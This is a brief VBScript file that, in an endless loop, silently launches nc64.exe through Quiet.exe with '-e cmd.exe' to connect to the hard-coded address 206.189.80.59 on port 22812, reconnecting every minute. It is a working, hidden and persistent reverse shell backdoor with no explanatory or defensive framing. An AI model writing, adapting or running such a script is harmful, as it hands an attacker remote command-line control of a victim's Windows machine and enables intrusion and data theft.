Set objShell = CreateObject("WScript.Shell")

' Get the path to the temporary folder
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")

' Define the command to run from the temporary folder
commandToRun = """" & tempFolder & "\Quiet.exe"" """ & tempFolder & "\nc64.exe"" -e cmd.exe 206.189.80.59 22812"

' Loop indefinitely
Do
    ' Run the command
    objShell.Run commandToRun, 0, True
    
    ' Wait for 1 minute (60,000 milliseconds)
    WScript.Sleep 60000
Loop
